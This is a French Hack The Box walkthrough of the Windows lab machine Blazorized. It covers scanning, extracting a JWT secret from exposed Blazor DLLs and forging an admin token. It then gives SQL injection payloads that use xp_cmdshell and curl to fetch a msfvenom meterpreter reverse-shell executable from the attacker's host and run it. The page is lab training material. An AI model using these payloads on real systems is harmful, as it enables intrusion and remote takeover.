<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>HTB: Blazorized</title>
<meta name=description content="Platforme: Hack The Box Lien: Blazorized Niveau: Difficle OS: Windows Blazorized présente une variété d&amp;rsquo;attaques Active Directory. Nous commençons par …"><meta name=keywords content="HackTheBox"><meta property="og:url" content="https://scorpiosec.com/fr/posts/htb-blazorized/"><meta property="og:type" content="website"><meta property="og:title" content="HTB: Blazorized"><meta property="og:description" content="Platforme: Hack The Box Lien: Blazorized Niveau: Difficle OS: Windows Blazorized présente une variété d&amp;rsquo;attaques Active Directory. Nous commençons par …"><meta property="og:image" content="https://scorpiosec.com/images/HTB-Blazorized/Blazorized.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/HTB-Blazorized/Blazorized.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="HTB: Blazorized"><meta name=twitter:description content="Platforme: Hack The Box Lien: Blazorized Niveau: Difficle OS: Windows Blazorized présente une variété d&amp;rsquo;attaques Active Directory. Nous commençons par …"><meta property="twitter:domain" content="https://scorpiosec.com/fr/posts/htb-blazorized/"><meta property="twitter:url" content="https://scorpiosec.com/fr/posts/htb-blazorized/"><meta name=twitter:image content="https://scorpiosec.com/images/HTB-Blazorized/Blazorized.png"><link rel=canonical href=https://scorpiosec.com/fr/posts/htb-blazorized/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/fr/posts/ aria-label=posts><span data-feather=book></span> Postes</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/projects/ aria-label=projects><span data-feather=code></span> Projets</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/tags/ aria-label=tags><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/categories/ aria-label=categories><span data-feather=folder></span> Catégories</a></div><div class=nav-link><a href=https://scorpiosec.com/ aria-label></a></div><div class="nav-link language-switcher"><a href=/posts/htb-blazorized/>English</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/fr/posts/><span data-feather=book></span> Postes</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/projects/><span data-feather=code></span> Projets</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/categories/><span data-feather=folder></span> Catégories</a></li><li class=nav-item><a href=https://scorpiosec.com/></a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>HTB: Blazorized</h1><small role=doc-subtitle></small><p class=post-date>11 min read |
<span class=post-date>7 Novembre 2024</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/fr/tags/hackthebox>HackTheBox</a></li></ul></div><div class=post-content><ul><li>Platforme: Hack The Box</li><li>Lien: <a href=https://app.hackthebox.com/machines/Blazorized>Blazorized</a></li><li>Niveau: Difficle</li><li>OS: Windows</li></ul><hr><p>Blazorized présente une variété d&rsquo;attaques Active Directory. Nous commençons par examiner un serveur web hébergeant une application Blazor WebAssembly avec un accès restreint au contenu. Par le biais d&rsquo;une énumération, nous trouvons plusieurs fichiers DLL associés à l&rsquo;application. La décompilation d&rsquo;un de ces fichiers révèle des informations sensibles, que nous utilisons pour forger un jeton Web JSON (JWT). Cela nous permet d&rsquo;accéder à un panneau d&rsquo;administration où nous identifions une vulnérabilité d&rsquo;injection SQL, ce qui nous donne un accès initial.</p><p>En exécutant Bloodhound, nous découvrons que l&rsquo;utilisateur actuel a le privilège <code>WriteSPN</code>, permettant une attaque Kerberoast ciblée pour un déplacement latéral vers un autre utilisateur. Ce second utilisateur a le droit de modifier le <code>Script-Path</code> d&rsquo;un autre utilisateur, droit que nous utilisons pour effectuer un autre déplacement latéral. Après une deuxième exécution de Bloodhound, nous découvrons que le dernier utilisateur fait partie d&rsquo;un groupe disposant du privilège <code>DCSync</code> sur le contrôleur de domaine, ouvrant ainsi la voie à une attaque DCSync pour obtenir le hachage de l&rsquo;administrateur.</p><p>Adresse IP cible - <code>10.10.11.22</code></p><h2 id=balayage>Balayage</h2><pre tabindex=0><code>./nmap_scan.sh 10.10.11.22 Blazorized
</code></pre><p><strong>Résultats</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Running detailed scan on open ports: 53,80,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,47001,49664,49665,49666,49667,49673,49674,49675,49678,49683,49708,49776
</span></span><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-11-07 18:52 CST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.11.22
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.065s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT      STATE SERVICE       VERSION
</span></span><span style=display:flex><span>53/tcp    open  domain        Simple DNS Plus
</span></span><span style=display:flex><span>80/tcp    open  http          Microsoft IIS httpd 10.0
</span></span><span style=display:flex><span>|_http-server-header: Microsoft-IIS/10.0
</span></span><span style=display:flex><span>|_http-title: Did not follow redirect to http://blazorized.htb
</span></span><span style=display:flex><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style=color:#56b6c2>(</span>server time: 2024-11-08 00:52:33Z<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>135/tcp   open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span><span style=display:flex><span>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: blazorized.htb0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>445/tcp   open  microsoft-ds?
</span></span><span style=display:flex><span>464/tcp   open  kpasswd5?
</span></span><span style=display:flex><span>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style=display:flex><span>636/tcp   open  tcpwrapped
</span></span><span style=display:flex><span>1433/tcp  open  ms-sql-s      Microsoft SQL Server <span style=color:#d19a66>2022</span> 16.00.1115.00; RC0+
</span></span><span style=display:flex><span>| ms-sql-ntlm-info: 
</span></span><span style=display:flex><span>|   10.10.11.22<span style=color:#98c379>\B</span>LAZORIZED: 
</span></span><span style=display:flex><span>|     Target_Name: BLAZORIZED
</span></span><span style=display:flex><span>|     NetBIOS_Domain_Name: BLAZORIZED
</span></span><span style=display:flex><span>|     NetBIOS_Computer_Name: DC1
</span></span><span style=display:flex><span>|     DNS_Domain_Name: blazorized.htb
</span></span><span style=display:flex><span>|     DNS_Computer_Name: DC1.blazorized.htb
</span></span><span style=display:flex><span>|     DNS_Tree_Name: blazorized.htb
</span></span><span style=display:flex><span>|_    Product_Version: 10.0.17763
</span></span><span style=display:flex><span>| ms-sql-info: 
</span></span><span style=display:flex><span>|   10.10.11.22<span style=color:#98c379>\B</span>LAZORIZED: 
</span></span><span style=display:flex><span>|     Instance name: BLAZORIZED
</span></span><span style=display:flex><span>|     Version: 
</span></span><span style=display:flex><span>|       name: Microsoft SQL Server <span style=color:#d19a66>2022</span> RC0+
</span></span><span style=display:flex><span>|       number: 16.00.1115.00
</span></span><span style=display:flex><span>|       Product: Microsoft SQL Server <span style=color:#d19a66>2022</span>
</span></span><span style=display:flex><span>|       Service pack level: RC0
</span></span><span style=display:flex><span>|       Post-SP patches applied: <span style=color:#e5c07b>true</span>
</span></span><span style=display:flex><span>|     TCP port: <span style=color:#d19a66>1433</span>
</span></span><span style=display:flex><span>|_    Clustered: <span style=color:#e5c07b>false</span>
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>SSL_Self_Signed_Fallback
</span></span><span style=display:flex><span>| Not valid before: 2024-11-07T10:01:36
</span></span><span style=display:flex><span>|_Not valid after:  2054-11-07T10:01:36
</span></span><span style=display:flex><span>|_ssl-date: 2024-11-08T00:53:37+00:00; +1s from scanner time.
</span></span><span style=display:flex><span>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span style=color:#56b6c2>(</span>Domain: blazorized.htb0., Site: Default-First-Site-Name<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>3269/tcp  open  tcpwrapped
</span></span><span style=display:flex><span>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 <span style=color:#56b6c2>(</span>SSDP/UPnP<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style=display:flex><span>|_http-title: Not Found
</span></span><span style=display:flex><span>9389/tcp  open  mc-nmf        .NET Message Framing
</span></span><span style=display:flex><span>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span style=color:#56b6c2>(</span>SSDP/UPnP<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-title: Not Found
</span></span><span style=display:flex><span>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span><span style=display:flex><span>49664/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>49665/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>49666/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>49667/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>49673/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>49674/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span><span style=display:flex><span>49678/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>49683/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>49708/tcp open  msrpc         Microsoft Windows RPC
</span></span><span style=display:flex><span>49776/tcp open  ms-sql-s      Microsoft SQL Server <span style=color:#d19a66>2022</span> 16.00.1115.00; RC0+
</span></span><span style=display:flex><span>| ms-sql-info: 
</span></span><span style=display:flex><span>|   10.10.11.22:49776: 
</span></span><span style=display:flex><span>|     Version: 
</span></span><span style=display:flex><span>|       name: Microsoft SQL Server <span style=color:#d19a66>2022</span> RC0+
</span></span><span style=display:flex><span>|       number: 16.00.1115.00
</span></span><span style=display:flex><span>|       Product: Microsoft SQL Server <span style=color:#d19a66>2022</span>
</span></span><span style=display:flex><span>|       Service pack level: RC0
</span></span><span style=display:flex><span>|       Post-SP patches applied: <span style=color:#e5c07b>true</span>
</span></span><span style=display:flex><span>|_    TCP port: <span style=color:#d19a66>49776</span>
</span></span><span style=display:flex><span>| ms-sql-ntlm-info: 
</span></span><span style=display:flex><span>|   10.10.11.22:49776: 
</span></span><span style=display:flex><span>|     Target_Name: BLAZORIZED
</span></span><span style=display:flex><span>|     NetBIOS_Domain_Name: BLAZORIZED
</span></span><span style=display:flex><span>|     NetBIOS_Computer_Name: DC1
</span></span><span style=display:flex><span>|     DNS_Domain_Name: blazorized.htb
</span></span><span style=display:flex><span>|     DNS_Computer_Name: DC1.blazorized.htb
</span></span><span style=display:flex><span>|     DNS_Tree_Name: blazorized.htb
</span></span><span style=display:flex><span>|_    Product_Version: 10.0.17763
</span></span><span style=display:flex><span>|_ssl-date: 2024-11-08T00:53:37+00:00; +1s from scanner time.
</span></span><span style=display:flex><span>| ssl-cert: Subject: <span style=color:#e06c75>commonName</span><span style=color:#56b6c2>=</span>SSL_Self_Signed_Fallback
</span></span><span style=display:flex><span>| Not valid before: 2024-11-07T10:01:36
</span></span><span style=display:flex><span>|_Not valid after:  2054-11-07T10:01:36
</span></span><span style=display:flex><span>Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Host script results:
</span></span><span style=display:flex><span>| smb2-time: 
</span></span><span style=display:flex><span>|   date: 2024-11-08T00:53:30
</span></span><span style=display:flex><span>|_  start_date: N/A
</span></span><span style=display:flex><span>| smb2-security-mode: 
</span></span><span style=display:flex><span>|   3:1:1: 
</span></span><span style=display:flex><span>|_    Message signing enabled and required
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 73.71 seconds
</span></span></code></pre></div><p>Le scan nmap nous donne quelques informations:</p><ul><li>La cible est un contrôleur de domaine (le nom de domaine est <code>blazorized.htb</code>).</li><li>Il y a un serveur web avec une redirection vers <code>http://blazorized.htb</code>.</li><li>La base de données utilisée est MSSQL sur le port <code>1433</code>.</li></ul><h2 id=enumération>Enumération</h2><p>Avant de vérifier le serveur web, nous procédons à une énumération SMB, mais nos tentatives avec netexec et enum4linux échouent.</p><p><img src=/images/HTB-Blazorized/netexec_smb_enum.png alt="netexec smb enumeration"></p><p><img src=/images/HTB-Blazorized/enum4linux_smb.png alt="enum4linux smb enumeration"></p><p>À <code>http://blazorized.htb/</code> nous trouvons un site web construit avec Blazor Web Assembly.</p><p><img src=/images/HTB-Blazorized/Blazorized_website.png alt="Blazorized website"></p><p><img src=/images/HTB-Blazorized/Blazorized_tech_stack.png alt="Blazorized wappalyzer"></p><p>Lorsque nous sélectionnons les autres sections telles que <code>Interesting Digital Gardens</code> et <code>Misc. Links</code>, nous obtenons le message <code>Failed fetching data from the API of Blazorized</code>.</p><p><img src=/images/HTB-Blazorized/failed_fetching.png alt="Blazorized failed data fetching"></p><p>Dans la section <code>Check for Updates</code> nous apprenons que seul le super administrateur peut accéder au contenu.</p><p><img src=/images/HTB-Blazorized/check_updates.png alt="Blazorized check updates"></p><p>Nous continuons notre énumération et essayons de trouver des répertoires cachés, mais sans succès.</p><pre tabindex=0><code>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://blazorized.htb
</code></pre><p>En revanche, l&rsquo;énumération des sous-domaines nous permet de découvrir <code>admin</code>.</p><pre tabindex=0><code>ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fc 404 -t 100 -u http://blazorized.htb -H &#34;Host: FUZZ.blazorized.htb&#34; -ic -fs 144
</code></pre><p><img src=/images/HTB-Blazorized/subdomain_enum.png alt="subdomain enumeration"></p><p>À <code>http://admin.blazorized.htb/</code> nous trouvons la page de connexion du super administrateur.</p><p><img src=/images/HTB-Blazorized/super_admin_login.png alt="super admin login"></p><p>Je ne connais pas très bien les applications Blazor WebAssembly, je consulte donc la documentation pour en savoir plus sur leur structure. Sur ce <a href=(https://github.com/dotnet/AspNetCore.Docs/blob/main/aspnetcore/blazor/project-structure.md#location-of-the-blazor-script)>compte Github</a>, nous apprenons que les applications Blazor ont toujours besoin d&rsquo;un script Blazor qui est essentiel au fonctionnement de l&rsquo;application. De plus, elles utilisent également des fichiers json.</p><p><img src=/images/HTB-Blazorized/Blazor_script.png alt="Blazor script location"></p><p><img src=/images/HTB-Blazorized/blazor_json_files.png alt="Blazor json files"></p><p>Nous ouvrons les <code>Developers Tools</code> (avec la touche <code>F12</code>) et trouvons <code>_framework/blazor.webassembly.js</code>.</p><p><img src=/images/HTB-Blazorized/blazor_script_found.png alt="Blazor script found in Blazorized"></p><p>Dans le fichier, nous trouvons du code qui n&rsquo;est pas bien formaté, nous utilisons <a href=https://beautifier.io/>beautifier.io</a> pour le rendre plus lisible.</p><p><img src=/images/HTB-Blazorized/js_file_beautified.png alt="Blazor script beautified"></p><p>Nous obtenons beaucoup de code JavaScript mais rien de particulier. Continuons avec Burp Suite, nous utilisons l&rsquo;extension <code>Blazor Traffic Processor</code> pour aider notre énumération.</p><p><img src=/images/HTB-Blazorized/BTP_extension.png alt="BTP extension"></p><p>Burp trouve un grand nombre de fichiers dll sous <code>_framework</code>. Nous pouvons télécharger n&rsquo;importe lequel d&rsquo;entre eux en allant sur <code>http://blazorized.htb/_framework/xxx.dll</code> (exemple : <code>blazorized.htb/_framework/Markdig.dll</code>), mais le faire manuellement sera certainement fastidieux.</p><p><img src=/images/HTB-Blazorized/dll_files_found.png alt="DLL files found"></p><p>Au bas de la liste des fichiers DLL dans Burp, nous trouvons un fichier appelé <code>blazor.boot.json</code>. Ce fichier sert de référence pour tous les fichiers DLL qui doivent être téléchargés pour que l&rsquo;application fonctionne correctement.</p><p><img src=/images/HTB-Blazorized/blazor_boot_json.png alt="blazor boot json"></p><p>En allant sur <code>http://blazorized.htb/_framework/blazor.boot.json</code>, on retrouve effectivement la même liste de fichiers DLL sous <code>assembly</code> plus un autre fichier appelé <code>Blazorized.Helpers.dll</code> qui ne figurait pas dans Burp.</p><p><img src=/images/HTB-Blazorized/DLL_files.png alt="DLL files list"></p><p>Des recherches supplémentaires nous apprennent qu&rsquo;il n&rsquo;est pas rare que les applications Blazor WebAssembly exposent leurs fichiers DLL ; en réalité, cela fait partie du fonctionnement de Blazor WebAssembly.</p><p>La particularité de ces applications est qu&rsquo;elles s&rsquo;exécutent côté client dans le navigateur grâce à WebAssembly. Pour exécuter le code .NET dans le navigateur:</p><ol><li>Le navigateur doit télécharger les fichiers DLL, y compris le code de l&rsquo;application et les dépendances.</li><li>Le moteur d&rsquo;exécution WebAssembly fourni par Blazor exécute ces DLL sur le client.</li></ol><p>Toutefois, il incombe aux développeurs de ces applications de s&rsquo;assurer qu&rsquo;aucune <strong>donnée sensible</strong> n&rsquo;est incluse dans les fichiers DLL côté client.</p><p>Nous téléchargeons les fichiers et essayons de trouver quelque chose d&rsquo;exploitable, nous utiliserons le script python ci-dessous.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#e06c75>os</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#e06c75>requests</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#e06c75>json</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>json_url</span> <span style=color:#56b6c2>=</span> <span style=color:#98c379>&#39;http://blazorized.htb/_framework/blazor.boot.json&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>output_dir</span> <span style=color:#56b6c2>=</span> <span style=color:#98c379>&#39;dll_files&#39;</span>
</span></span><span style=display:flex><span><span style=color:#e06c75>os</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>makedirs</span>(<span style=color:#e06c75>output_dir</span>, <span style=color:#e06c75>exist_ok</span><span style=color:#56b6c2>=</span><span style=color:#e5c07b>True</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e06c75>response</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>requests</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>get</span>(<span style=color:#e06c75>json_url</span>)
</span></span><span style=display:flex><span><span style=color:#e06c75>data</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>response</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>json</span>()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>def</span> <span style=color:#61afef;font-weight:700>download_dll</span>(<span style=color:#e06c75>dll_name</span>, <span style=color:#e06c75>dll_hash</span>):
</span></span><span style=display:flex><span>    <span style=color:#e06c75>dll_url</span> <span style=color:#56b6c2>=</span> <span style=color:#98c379>f</span><span style=color:#98c379>&#39;http://blazorized.htb/_framework/</span><span style=color:#98c379>{</span><span style=color:#e06c75>dll_name</span><span style=color:#98c379>}</span><span style=color:#98c379>&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#e06c75>file_path</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>os</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>path</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>join</span>(<span style=color:#e06c75>output_dir</span>, <span style=color:#e06c75>dll_name</span>)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#c678dd>try</span>:
</span></span><span style=display:flex><span>        <span style=color:#e06c75>dll_response</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>requests</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>get</span>(<span style=color:#e06c75>dll_url</span>)
</span></span><span style=display:flex><span>        <span style=color:#e06c75>dll_response</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>raise_for_status</span>()  <span style=color:#7f848e># Check for request errors</span>
</span></span><span style=display:flex><span>        <span style=color:#c678dd>with</span> <span style=color:#e5c07b>open</span>(<span style=color:#e06c75>file_path</span>, <span style=color:#98c379>&#39;wb&#39;</span>) <span style=color:#c678dd>as</span> <span style=color:#e06c75>file</span>:
</span></span><span style=display:flex><span>            <span style=color:#e06c75>file</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>write</span>(<span style=color:#e06c75>dll_response</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>content</span>)
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>print</span>(<span style=color:#98c379>f</span><span style=color:#98c379>&#39;Downloaded </span><span style=color:#98c379>{</span><span style=color:#e06c75>dll_name</span><span style=color:#98c379>}</span><span style=color:#98c379>&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#c678dd>except</span> <span style=color:#e06c75>requests</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>exceptions</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>RequestException</span> <span style=color:#c678dd>as</span> <span style=color:#e06c75>e</span>:
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>print</span>(<span style=color:#98c379>f</span><span style=color:#98c379>&#39;Failed to download </span><span style=color:#98c379>{</span><span style=color:#e06c75>dll_name</span><span style=color:#98c379>}</span><span style=color:#98c379>: </span><span style=color:#98c379>{</span><span style=color:#e06c75>e</span><span style=color:#98c379>}</span><span style=color:#98c379>&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>if</span> <span style=color:#98c379>&#39;resources&#39;</span> <span style=color:#56b6c2>in</span> <span style=color:#e06c75>data</span> <span style=color:#56b6c2>and</span> <span style=color:#98c379>&#39;assembly&#39;</span> <span style=color:#56b6c2>in</span> <span style=color:#e06c75>data</span>[<span style=color:#98c379>&#39;resources&#39;</span>]:
</span></span><span style=display:flex><span>    <span style=color:#c678dd>for</span> <span style=color:#e06c75>dll_name</span>, <span style=color:#e06c75>dll_hash</span> <span style=color:#56b6c2>in</span> <span style=color:#e06c75>data</span>[<span style=color:#98c379>&#39;resources&#39;</span>][<span style=color:#98c379>&#39;assembly&#39;</span>]<span style=color:#56b6c2>.</span><span style=color:#e06c75>items</span>():
</span></span><span style=display:flex><span>        <span style=color:#e06c75>download_dll</span>(<span style=color:#e06c75>dll_name</span>, <span style=color:#e06c75>dll_hash</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>if</span> <span style=color:#98c379>&#39;resources&#39;</span> <span style=color:#56b6c2>in</span> <span style=color:#e06c75>data</span> <span style=color:#56b6c2>and</span> <span style=color:#98c379>&#39;lazyAssembly&#39;</span> <span style=color:#56b6c2>in</span> <span style=color:#e06c75>data</span>[<span style=color:#98c379>&#39;resources&#39;</span>]:
</span></span><span style=display:flex><span>    <span style=color:#c678dd>for</span> <span style=color:#e06c75>dll_name</span>, <span style=color:#e06c75>dll_hash</span> <span style=color:#56b6c2>in</span> <span style=color:#e06c75>data</span>[<span style=color:#98c379>&#39;resources&#39;</span>][<span style=color:#98c379>&#39;lazyAssembly&#39;</span>]<span style=color:#56b6c2>.</span><span style=color:#e06c75>items</span>():
</span></span><span style=display:flex><span>        <span style=color:#e06c75>download_dll</span>(<span style=color:#e06c75>dll_name</span>, <span style=color:#e06c75>dll_hash</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;Download complete.&#34;</span>)
</span></span></code></pre></div><p>Utilisons <a href=https://www.decompiler.com/>decompiler.com</a> pour décompiler nos fichiers DLL (vous pouvez aussi utiliser DNSpy sous Windows).</p><p>Décompilez <code>Blazorized.Helpers.dll</code> et allez à <code>Blazorized.Helpers</code> &ndash;> <code>JWT.cs</code>. Nous y trouvons tout ce qui est nécessaire pour créer un JWT (JSON Web Token) Super Admin. Nous utilisons <a href=https://jwt.io/>jwt.io</a> pour cette tâche.</p><p><img src=/images/HTB-Blazorized/JWT_info.png alt="JWT info"></p><p><img src=/images/HTB-Blazorized/JWT_info2.png alt="JWT info2"></p><p><img src=/images/HTB-Blazorized/JWT_info3.png alt="JWT info3"></p><p>Vous trouverez ci-dessous toutes les informations dont nous avons besoin:</p><pre tabindex=0><code># Pour le Header (make sure to change the algorithm to 512 at the top of the page)

&#34;alg&#34;: 512
&#34;typ&#34;: &#34;JWT&#34;

# Pour le payload

&#34;http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress&#34;: &#34;superadmin@blazorized.htb&#34;
&#34;http://schemas.microsoft.com/ws/2008/06/identity/claims/role&#34;: &#34;Super_Admin&#34;
&#34;iss&#34;: &#34;http://api.blazorized.htb&#34;
&#34;aud&#34;: &#34;http://admin.blazorized.htb&#34;
&#34;exp&#34;: &#34;xxxxxxxxxxx&#34; 

# Pour la section VERIFY SIGNATURE, il suffit d&#39;utiliser la valeur de jwtSymmetricSecurityKey
</code></pre><blockquote><p>N&rsquo;utilisez pas la valeur <code>exp</code> dans la capture d&rsquo;écran, elle ne sera plus valide au moment où vous lirez cet article. Utilisez plutôt <a href=https://www.epochconverter.com/>EpochConverter</a> pour générer une valeur valide. Si l&rsquo;heure actuelle dépasse l&rsquo;horodatage <code>exp</code>, le jeton sera rejeté comme étant expiré.</p></blockquote><p><img src=/images/HTB-Blazorized/jwt_value.png alt="JWT value"></p><p>Une fois que vous avez votre valeur encodée, allez à <code>http://admin.blazorized.htb/</code>, ouvrez les outils de développement avec <code>F12</code>, puis dans<code>Storage</code> &ndash;> <code>Local Storage</code> et ajoutez votre token avec</p><pre tabindex=0><code>key = jwt
Value = YOUR_ENCODED_JWT
</code></pre><p><img src=/images/HTB-Blazorized/jwt_local_storage.png alt="JWT local storage"></p><p>Après avoir actualisé la page, nous accédons au tableau de bord du super administrateur.</p><p><img src=/images/HTB-Blazorized/super_admin-panel.png alt="Super Admin Panel"></p><h2 id=accès-initial>Accès initial</h2><p>Dans la section <code>Check Duplicate Post Titles</code> nous trouvons une fonctionnalité qui utilise très probablement la base de données (MSSQL), nous nous en servons et essayons d&rsquo;obtenir un reverse shell via des injections SQL.</p><ol><li>Nous commençons par créer un fichier <code>exe</code> malveillant.</li></ol><pre tabindex=0><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=LISTENER_PORT -f exe -o shell.exe
</code></pre><ol start=2><li>Après avoir mis en place un serveur web, nous transférons le fichier sur le système cible.</li></ol><pre tabindex=0><code>&#39;; IF (SELECT CONVERT(INT, value_in_use) FROM sys.configurations WHERE name = &#39;xp_cmdshell&#39;) = 1 EXEC master.dbo.xp_cmdshell &#39;powershell -c &#34;curl http://YOUR_IP:WEBSERVER_PORT/shell.exe -o %TEMP%\shell.exe&#34; --
</code></pre><p><img src=/images/HTB-Blazorized/revshell1.png alt="malicious file dropped on target"></p><ol start=3><li><p>Nous démarrons un listener dans Metasploit via <code>exploit/multi/handler</code>.</p></li><li><p>Nous exécutons le fichier malicieux <code>exe</code> sur la cible et obtenons un shell meterpreter en tant que <code>NU_1055</code>.</p></li></ol><pre tabindex=0><code>&#39;; IF (SELECT CONVERT(INT, value_in_use) FROM sys.configurations WHERE name = &#39;xp_cmdshell&#39;) = 1 EXEC master.dbo.xp_cmdshell &#39; %TEMP%\shell.exe --
